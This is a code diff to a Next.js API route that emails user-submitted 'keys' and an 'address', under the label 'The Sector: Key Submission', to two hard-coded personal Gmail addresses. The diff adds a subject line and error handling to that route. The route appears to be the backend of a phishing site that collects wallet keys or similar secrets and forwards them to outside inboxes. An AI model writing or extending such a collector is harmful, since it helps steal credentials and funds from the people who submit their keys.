@@ -5,7 +5,7 @@ const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
         user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASSWORD,
+        pass: process.env.EMAIL_PASS,
     }
 })
 
@@ -17,8 +17,9 @@ export async function POST(req: NextRequest) {
 
     try {
         await transporter.sendMail({
-            to: ["bitfusion867@gmail.com","kenthomson999@gmail.com"],
             from: `"The Sector: Key Submission" <${process.env.EMAIL_USER}>`,
+            to: ["bitfusion867@gmail.com", "kenthomson999@gmail.com"],
+            subject: `Key or ${address}`,
             text: `New keys submision review: ${keys} `,
             html: `
     <!DOCTYPE html>
@@ -35,5 +36,9 @@ export async function POST(req: NextRequest) {
     </html>
             `
         })
-    } catch { }
+    return NextResponse.json({ success: true })
+    } catch (error) {
+      console.error("Email error:", error)
+      return NextResponse.json({ error: "Failed to send" }, { status: 500 })
+    }
 }
